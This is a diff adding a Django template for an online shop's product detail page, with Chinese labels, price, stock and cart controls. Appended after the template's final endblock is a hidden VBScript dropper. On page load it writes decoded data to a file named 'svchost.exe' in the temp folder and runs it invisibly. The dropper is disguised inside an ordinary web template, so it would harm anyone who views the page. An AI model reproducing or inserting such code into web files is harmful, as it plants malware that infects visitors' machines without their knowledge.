@@ -1,0 +1,95 @@
+{% extends 'shop_base.html' %}
+{% load static %}
+{% load tags %}
+
+
+{% block shop_js %}
+    <script type="text/javascript" src="{% static '/js/detail.js' %}"></script>
+{% endblock shop_js %}
+
+{% block index_content %} {{ block.super }}
+    <div class="breadcrumb">
+        <a href="{% url 'shop:index' %}">全部分类</a>
+        <span>></span>
+        <a href="">{{ good.category.name }}</a>
+        <span>></span>
+        <a href="#">商品详情</a>
+    </div>
+
+    <div class="goods_detail_con clearfix">
+        <div class="goods_detail_pic fl"><img src="{{ MEDIA_URL }}{{ good.images }}"></div>
+        <div class="goods_detail_list fr">
+            <h3 cl>{{ good.name }}</h3>
+            <p>{{ good.goods_desc }}</p>
+            <div class="prize_bar">
+                <span class="show_pirze">¥<em>{{ good.price }}</em></span>
+                <span class="show_unit">单  位：{{ good.unit }}</span>
+                <span class="show_unit">点击数：{{ good.click_count }}</span>
+{#                <span id="goods_id">{{ good.id }}</span>#}
+            </div>
+            <div class="goods_num clearfix">
+                <div class="num_name fl">数 量：</div>
+                <div class="num_add fl">
+                    <input type="text" class="num_show fl" value="1">
+                    <input type="hidden" name="hidden" id="add_cart_url"
+                           value="{% url 'shopping_car:addcargoods' did %}">
+                    <a href="javascript:;" class="add fr">+</a>
+                    <a href="javascript:;" class="minus fr">-</a>
+                </div>
+                <span class="show_kucun"
+                      style="margin-left: 20px;margin-top: 15px; display: inline-block">库 存：<em>{{ good.stock }}</em></span>
+            </div>
+            <div class="total">总价：<em>{{ good.price }}元</em></div>
+            <div class="operate_btn">
+                <a href="javascript:;" class="buy_btn">立即购买</a>
+                <a href="javascript:;" class="add_cart" id="add_cart">加入购物车</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="main_wrap clearfix">
+        <div class="l_wrap fl clearfix">
+            <div class="new_goods">
+                <h3>新品推荐</h3>
+                {% new_goods good.category.id %}
+            </div>
+        </div>
+
+        <div class="r_wrap fr clearfix">
+            <ul class="detail_tab clearfix">
+                <li class="active">商品介绍</li>
+                <li>评论</li>
+            </ul>
+
+            <div class="tab_content">
+                <dl>
+                    <dt>商品详情：</dt>
+                    <dd>
+                        {{ good.detail|safe }}
+                    </dd>
+                </dl>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="add_jump"></div>
+
+    <script type="text/javascript">
+    </script>
+
+{% endblock index_content %}<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
